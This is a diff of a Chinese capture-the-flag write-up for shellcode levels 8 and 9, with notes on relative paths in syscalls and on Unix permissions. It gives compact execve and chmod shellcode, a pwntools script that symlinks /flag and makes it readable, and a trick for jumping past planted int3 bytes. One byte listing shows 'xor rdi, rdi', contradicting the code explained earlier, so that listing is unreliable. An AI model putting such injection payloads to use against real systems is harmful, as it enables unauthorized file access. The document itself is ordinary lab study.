@@ -343,7 +343,112 @@ if (isatty(STDIN_FILENO)) {
 `/dev/null`：特殊设备文件，丢弃所有写入的数据，读取时返回 EOF。
 通过这些设备文件，Unix 和类 Unix 系统提供了一种灵活的方式来管理和使用各种终端设备，使得系统管理和编程变得更加方便和直观。
 
-### 8.
+### 8. 系统调用的路径问题
+
+当系统调用（如 execve、chmod 等）传入相对路径时，操作系统会根据当前工作目录解析该路径。当前工作目录是进程的属性，通常是进程启动时的目录。
+
+```asm
+push 0x31  /* ASCII  '1' */
+mov rdi, rsp
+push 0
+pop rsi
+xor edx, edx
+push 0x3b
+pop rax
+syscall
+
+push 0x31: 将字符 '1' 的 ASCII 值 0x31 压入栈中。
+mov rdi, rsp: 将栈指针 rsp 的当前值（此时指向字符 '1'）加载到寄存器 rdi 中。rdi 是 execve 系统调用的第一个参数，用于指向可执行文件路径。
+push 0: 将值 0 压入栈中。
+pop rsi: 将栈顶的值 0 弹出到寄存器 rsi 中。rsi 是 execve 系统调用的第二个参数，用于传递命令行参数数组（argv），这里传递空指针。
+xor edx, edx: 将寄存器 edx 置零。edx 是 execve 系统调用的第三个参数，用于传递环境变量数组（envp），这里传递空指针。
+push 0x3b: 将 execve 系统调用号 0x3b（59）压入栈中。
+pop rax: 将栈顶的值 59 弹出到寄存器 rax 中。rax 用于存储系统调用号。
+syscall: 执行系统调用。
+```
+
+**执行效果**
+- rdi 包含相对路径 "1" 的地址。
+- execve 系统调用将使用相对路径 "1"。
+- 内核会根据当前工作目录解析相对路径 "1"
+
+
+### 9. Linux系统文件权限
+
+文件权限是 UNIX 和类 UNIX 操作系统中的一个核心概念，它们决定了谁可以读取、写入和执行文件。文件权限由三组数字组成，每组数字代表一个不同的用户类别的权限：
+- 用户（User, u）: 文件的所有者。
+- 组（Group, g）: 与文件所有者同组的用户。
+- 其他用户（Others, o）: 系统上所有其他用户。
+
+相当于每个用户类别由3位2进制数组成组成，最高位代表是否可读，中间位代表是否可写，最低位代表是否可以执行。
+
+**文件权限的表示法**
+文件权限可以用三位八进制数表示，每位数字代表一组权限。每个权限位的值如下：
+- 4: 读权限（r, read）
+- 2: 写权限（w, write）
+- 1: 执行权限（x, execute）
+
+这三种权限可以组合起来，形成不同的权限设置：
+- 7: 读、写和执行（4 + 2 + 1 = 7）
+- 6: 读和写（4 + 2 = 6）
+- 5: 读和执行（4 + 1 = 5）
+- 4: 只有读（4）
+- 3: 写和执行（2 + 1 = 3）
+- 2: 只有写（2）
+- 1: 只有执行（1）
+- 0: 无权限（0）
+
+**常见权限设置**
+
+**600**
+
+- **用户（所有者）**: 读和写（6）
+- **组**: 无权限（0）
+- **其他用户**: 无权限（0）
+
+权限表示：
+
+```
+-rw------- (600)
+```
+
+**644**
+
+- **用户（所有者）**: 读和写（6）
+- **组**: 读（4）
+- **其他用户**: 读（4）
+
+权限表示：
+
+```
+-rw-r--r-- (644)
+```
+
+**755**
+
+- **用户（所有者）**: 读、写和执行（7）
+- **组**: 读和执行（5）
+- **其他用户**: 读和执行（5）
+
+权限表示：
+
+```
+-rwxr-xr-x (755)
+```
+
+**777**
+
+- **用户（所有者）**: 读、写和执行（7）
+- **组**: 读、写和执行（7）
+- **其他用户**: 读、写和执行（7）
+
+权限表示：
+
+```
+-rwxrwxrwx (777)
+```
+
+### 10.
 
 
 ## level1
@@ -707,4 +812,123 @@ int main(){
 
 ## level8
 
+这个题跟之前题目的不同在于，将整体shellcode的大小限制在0x12个字节以内。之前的方法不能正常适用本关卡，因为代码大小超过了要求的大小。
 
+关于系统调用的路径问题，可以看`问题8`的讲解。
+
+除了这个以外，在之前的关卡中，如果我想向rdi寄存器中传入某个字符串的地址，是利用`lea rid [rel filename]`进行传递的。除了这个方法，我想不到什么别的方法。
+
+通过观察论坛才发现，可以通过先`push 1`然后`mov rdi, rsp`的方式，通过栈的特点，将栈顶指针传递给`rdi`。占用的字节数少，也能达到同样的效果。除了这种获取地址的方式，给寄存器赋值，也可以使用先`push`然后`pop`的方式，这样占用的字节数也少。你要是`mov立即数`的话，至少都五六个字节。
+
+```asm
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002436f000 | 6a 31                                         | push 0x31
+0x000000002436f002 | 48 89 e7                                      | mov rdi, rsp
+0x000000002436f005 | 6a 00                                         | push 0
+0x000000002436f007 | 5e                                            | pop rsi
+0x000000002436f008 | 48 31 ff                                      | xor rdi, rdi
+0x000000002436f00b | 6a 3b                                         | push 0x3b
+0x000000002436f00d | 58                                            | pop rax
+0x000000002436f00e | 0f 05                                         | syscall 
+```
+
+讲解完上面的东西以后，我们可以利用`chmod`系统调用，在当前目录创建一个指向`flag`文件的符号链接`f`，然后在当前目录下将shellcode传递给babay程序，这样`chmod`系统调用会首先补全路径--`当前目录/f`，然后修改这个符号链接所指向的源文件的权限，我们修改为读就可以了。然后通过cat读取就行了。
+
+```python
+from pwn import *
+from warnings import filterwarnings
+import os
+
+filterwarnings(action='ignore', category=BytesWarning)
+elf = ELF('/challenge/babyshell_level8', checksec=False)
+context.binary = elf
+context.log_level="INFO"
+
+shellcode = f'''
+push 0x66  /* ASCII für 'f' */
+mov rdi, rsp
+push 4
+pop rsi
+push SYS_chmod
+pop rax
+syscall
+'''
+
+os.system('ln -s /flag f')
+p = process()
+payload = asm(shellcode, arch='amd64')
+p.sendlineafter("from stdin", payload)
+output = p.recvall().decode('utf-8')
+print(output)
+p.close()
+os.system('cat f')
+
+```
+
+既然系统调用会用当前执行目录补全相对路径的话，之前的方法也是可以用的。我们可以手动在当前目录下，创建一个指向`openflag`文件的符号链接，然后把这个符号链接文件名传递给`execve`系统调用。然后`baby`程序会运行`openflag`程序，`openflag`程序会把`flag文件`输出。
+
+
+
+## level9
+
+修改10的倍数位置的二进制位cc, 我们可以在临近10位置的时候增加一个短跳转。跳过10的奇数倍。
+
+```c
+for (int i = 0; i < shellcode_size; i++)
+{
+    if ((i / 10) % 2 == 1)
+    {
+        ((unsigned char *) shellcode_mem)[i] = '\xcc';
+    }
+}
+```
+
+```asm
+BITS 64
+
+section .text
+global _start
+
+_start:
+    push 0x66  
+    mov rdi, rsp
+    jmp _1
+    nop
+    nop
+    nop
+    times 10 nop  # 跳过第11-20个字节
+
+_1:
+    push 4
+    pop rsi
+    push 90
+    pop rax
+    syscall
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000001b4a5000 | 6a 66                                         | push 0x66
+0x000000001b4a5002 | 48 89 e7                                      | mov rdi, rsp
+0x000000001b4a5005 | eb 0d                                         | jmp 0x1b4a5014
+0x000000001b4a5007 | 90                                            | nop 
+0x000000001b4a5008 | 90                                            | nop 
+0x000000001b4a5009 | 90                                            | nop 
+0x000000001b4a500a | cc                                            | int3 
+0x000000001b4a500b | cc                                            | int3 
+0x000000001b4a500c | cc                                            | int3 
+0x000000001b4a500d | cc                                            | int3 
+0x000000001b4a500e | cc                                            | int3 
+0x000000001b4a500f | cc                                            | int3 
+0x000000001b4a5010 | cc                                            | int3 
+0x000000001b4a5011 | cc                                            | int3 
+0x000000001b4a5012 | cc                                            | int3 
+0x000000001b4a5013 | cc                                            | int3 
+0x000000001b4a5014 | 6a 04                                         | push 4
+0x000000001b4a5016 | 5e                                            | pop rsi
+0x000000001b4a5017 | 6a 5a                                         | push 0x5a
+0x000000001b4a5019 | 58                                            | pop rax
+0x000000001b4a501a | 0f 05                                         | syscall 
+```
+
+## level10
